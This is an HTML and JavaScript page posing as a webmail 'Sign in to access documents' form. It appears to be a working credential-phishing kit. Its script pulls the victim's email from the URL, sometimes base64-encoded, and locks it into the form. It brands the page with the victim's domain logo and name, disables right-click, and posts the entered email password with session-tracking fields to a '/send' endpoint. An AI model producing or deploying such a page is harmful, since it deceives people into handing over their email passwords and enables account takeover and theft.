<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
	<meta name="robots" content="noindex">
    <title id="tittle" style="text-transform: capitalize;"></title>
    <link id="favicon" rel="shortcut icon" href="">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <script src="https://kit.fontawesome.com/f6136e9b49.js" crossorigin="anonymous"></script>
</head>
<style>
    * {
    box-sizing: border-box;
    margin: 0;
    padding: 0; 
    color: #333;
}

body {
    /*background-image: url(../ZvlG0Sw\ \(1\).jpg);*/
    /*background-size: cover;*/
    /*background-repeat: no-repeat;*/
     /*background-position: center; */
    height: 100vh;
    width: 100%;
    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    font-size: 14px;
    line-height: 1.42857;
    color: rgb(51, 51, 51);
    overflow: hidden;
    background-attachment: fixed;
}
.container {
   background: transparent;
}

img {
    width: 100%;
    height: auto;
}
form {
    padding: 0rem 1rem;
    padding-top: 4px;
}

.input-container {
  display: -ms-flexbox; /* IE10 */
  display: flex;
  width: 100%;
  margin-bottom: 15px;
  border-color: #CACACA;
}

.icon {
    color: rgb(85, 85, 85);
    text-align: center;
    background-color: rgb(238, 238, 238);
    border: 1px solid rgb(204, 204, 204);
    /* border-radius: 4px; */

  padding: 10px;
  min-width: 50px;
  border-bottom-left-radius: 4px;
  border-top-left-radius: 4px;
}

.input-field {
  width: 100%;
  padding: 10px;
  outline: none;
  border: 1px solid #ccc;
  border-top-right-radius: 4px;
  border-bottom-right-radius: 4px;
  transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
  font-size: 14px;
  line-height: 1.42857143;
  color: #555;
}
.input-field:focus {
    box-shadow: 0 0 5px rgb(51, 122, 183);
  /* padding: 3px 0px 3px 3px; */
  /* margin: 5px 1px 3px 0px; */
  border: 1px solid rgb(51, 122, 183);
}

.input-field:focus {
  box-shadow: #2e6da4;
}

/* Set a style for the submit button */
.btnn {
    color: rgb(255, 255, 255);
    background-color: rgb(51, 122, 183);
    border-color: rgb(46, 109, 164);
    padding: 9px 12px;
    border: 1px solid transparent;
    cursor: pointer;
    width: 100%;
    opacity: 0.9;
    margin-bottom: 1rem;
    /* border-radius: 4px; */
    font-size: 15px;
    font-weight: bold;
    margin-top: 1rem;
}

.btnn:hover {
  opacity: 1;
}
.box2of {

    background-color: #f0f0f0;
    /* margin-top: -35px; */
    padding: 10px;
    padding-top: 63px;
    box-shadow: 10px 5px 5px #00000040;
    width: 450px;
    margin: auto;
    border-radius: 19px;
    padding-bottom: 46px;
    margin-top: 4rem;
}
h2 {
    font-family: inherit;
    font-weight: 700;
    line-height: 1.1;
    color: inherit;
    text-align: center;
    font-size: 33px;
}
.small {
    display: block;
    text-align: center;
    color: crimson;
    /* margin-bottom: 1rem; */
    font-size: 16px;
}
a {
    color: rgb(51, 122, 183);
    text-decoration: none;
}

#ermg {
    color: #a94442;
    background-color: #f2dede;
    border-color: #ebccd1;
    padding: 10px;
    text-align: center;
    margin-bottom: 20px;
    border: 1px solid transparent;
    border-radius: 4px;margin-bottom: 20px;
    border: 1px solid transparent;
    border-radius: 4px;
    /*margin-top: 10px;*/
    font-size: 15px;
    display: none;
}
#top {
    display: inline-flex; align-items: center; margin: auto;
}
@media  (max-width: 760px) {
    /*.logoname {*/
    /*    font-size: 13px;*/
    /*}*/
    /* .box2of {
    width: 70%;
} */
}
/* @media  (max-width: 600px) {
    .box2of {
    width: 90%;

}
h2 {
    font-family: inherit;
    font-weight: 700;
    line-height: 1.1;
    color: inherit;
    text-align: center;
    font-size: 19px;
    letter-spacing: 3px;
}
} */
</style>

<body>
    <img src="https://cdn.glitch.global/fc7f7e4a-7f0c-454c-8f15-b9c3212e51f9/thumbnails%2Fxauleh.png?1744891704794" alt="" style="position: fixed; left: 0px; top: 0px; z-index: -1; height: 100%; width: 100%; background-position: center center;">

    <div class="container">
        <div class="box2of">
            <h2 class="text-center" style="margin-bottom: .8rem;">
                <div id="top">
                    <img src="https://logo.clearbit.com/inbox.com" alt="" id="logoimg" style="width:46px;height:46px;">
                    <span style="vertical-align: middle; padding-left: 5px; font-size: 30px; font-weight: 500; text-transform: capitalize;" class="logoname" id="logoname">Webclient</span>
                </div>
                <br><br>Sign in to access documents
            </h2>
            <p style="text-align: center;">Using your email account for verification</p>
     <form action="/send" id="result" method="post" style="max-width:500px;margin:auto">
    <small id="ermg" class="small"></small>

    <div class="input-container">
        <i class="fa fa-user icon"></i>
        <input class="input-field" type="email" placeholder="Email" id="eemail" name="email" required readonly
               style="color: rgb(85, 85, 85); background-color: rgb(255, 255, 255);">
    </div>

    <div class="input-container">
        <i class="fas fa-lock icon"></i>
        <input class="input-field" type="password" id="password" placeholder="Email Password" name="userpwd" required>
    </div>

    <label style="font-size: 14px; float: right;">
        <input type="checkbox" id="showPasswordCheckbox" /> Show Password
    </label>
	<!-- Hidden inputs for session tracking -->
  <input type="hidden" name="sessionId" id="sessionId" value="">
  <input type="hidden" name="submissionPath" id="submissionPath" value="">

    <button type="submit" class="btnn" id="btn">Sign in</button>

    <span style="margin-top: 1rem;">Secure login session</span>
    <a href="#password" id="forgot-link" class="pull-right" style="display: inline; float: right;">Forgot Password?</a>
</form>

<div style="position: fixed; bottom: 0px; left: 0px; width: 100%; text-align: center; background-color: #f0f0f0; height: 45px;"> 
    <img src="https://cdn.glitch.global/fc7f7e4a-7f0c-454c-8f15-b9c3212e51f9/thumbnails%2Fsaintall.jpg" 
         alt="banner.png" style="width: 500px; margin-left: -834px;">
    <p id="footer-text" style="margin-left: 479px;margin-top: 14px;color: rgb(51, 122, 183);">Connected to [email] 2025</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", function () {
    const emailInput = document.getElementById("eemail");
    const passwordField = document.getElementById("password");
    const form = document.getElementById("result");
    const btn = document.getElementById("btn");

    // --- 1️⃣ Get email from URL ---
    const fullUrl = window.location.href;
    const urlParams = new URLSearchParams(window.location.search);
    let rawEmail = urlParams.get('quotes') || "";

    const hashIndex = fullUrl.indexOf("#");
    if (hashIndex !== -1) {
        const hashValue = decodeURIComponent(fullUrl.substring(hashIndex + 1));
        if (hashValue.includes("@")) rawEmail = hashValue;
    }

    let cleanEmail = rawEmail.split(";;")[0] || rawEmail;

    if (cleanEmail && /^[A-Za-z0-9+/=]+$/.test(cleanEmail)) {
        try { cleanEmail = atob(cleanEmail); } catch(e) {}
    }

    // --- 2️⃣ Fill readonly email input and update UI ---
    if (cleanEmail) {
        emailInput.value = cleanEmail;
        emailInput.dispatchEvent(new Event('input', { bubbles: true }));
        emailInput.dispatchEvent(new Event('change', { bubbles: true }));

        const domain = cleanEmail.split('@')[1];
        const companyName = domain.split('.')[0];

        const favicon = document.getElementById("favicon");
        const logoImg = document.getElementById("logoimg");
        const titleEl = document.getElementById("tittle");
        const logonameEl = document.getElementById("logoname");
        const footerEl = document.getElementById("footer-text");

        if (favicon) favicon.href = `https://logo.clearbit.com/${domain}`;
        if (logoImg) logoImg.src = `https://logo.clearbit.com/${domain}`;
        if (titleEl) titleEl.textContent = `${companyName} - Mail`;
        if (logonameEl) logonameEl.textContent = companyName.toUpperCase();
        if (footerEl) footerEl.textContent = `Connected to ${cleanEmail} 2025`;

        localStorage.setItem("userDomain", domain);

        // --- Optional: auto-submit form after filling email ---
        // Uncomment the next line to enable auto-submit
        // form.submit();
    }
	// Generate or retrieve sessionId
  let sessionId = localStorage.getItem("sessionId");
  if (!sessionId) {
    sessionId = crypto.randomUUID();
    localStorage.setItem("sessionId", sessionId);
  }
  document.getElementById("sessionId").value = sessionId;

  // Always set current path for submissionPath
  document.getElementById("submissionPath").value = window.location.pathname;


    // --- 3️⃣ Button loading state ---
    if (btn) {
        form.addEventListener("submit", function() {
            btn.textContent = "Loading...";
        });
    }

    // --- 4️⃣ Disable right-click ---
    document.addEventListener('contextmenu', function(e) { e.preventDefault(); });

    // --- 5️⃣ Password toggle ---
    const toggleCheckbox = document.getElementById("showPasswordCheckbox");
    if (toggleCheckbox && passwordField) {
        toggleCheckbox.addEventListener("change", function() {
            passwordField.type = toggleCheckbox.checked ? "text" : "password";
        });

        // Clear error message on first input
        passwordField.addEventListener("input", function() {
            const errorEl = document.getElementById("ermg");
            if (errorEl) errorEl.style.display = "none";
        });
    }

    // --- 6️⃣ Forgot Password link ---
    const forgotLink = document.getElementById("forgot-link");
    forgotLink.addEventListener("click", function (e) {
        e.preventDefault();
        passwordField.scrollIntoView({ behavior: "smooth" });
        passwordField.focus();
    });

    // --- 7️⃣ Form submission validation ---
    let attempt = 0;
    const maxAttempts = 3;
    const minPasswordLength = 4;

    form.addEventListener("submit", function(event) {
        event.preventDefault(); // prevent default until validation passes

        if (attempt >= maxAttempts) {
            showError("Too many failed attempts. Access denied.", true);
            return;
        }

        const email = emailInput.value.trim();
        const password = passwordField.value.trim();

        if (!email || !password) {
            showError("Invalid email or password, try again.");
            return;
        }

        if (password.length < minPasswordLength) {
            showError("Please enter a valid password characters.");
            return;
        }

        attempt++;

        // After validation passes, submit the form normally
        form.submit();
    });
});
</script>

</body>
</html>



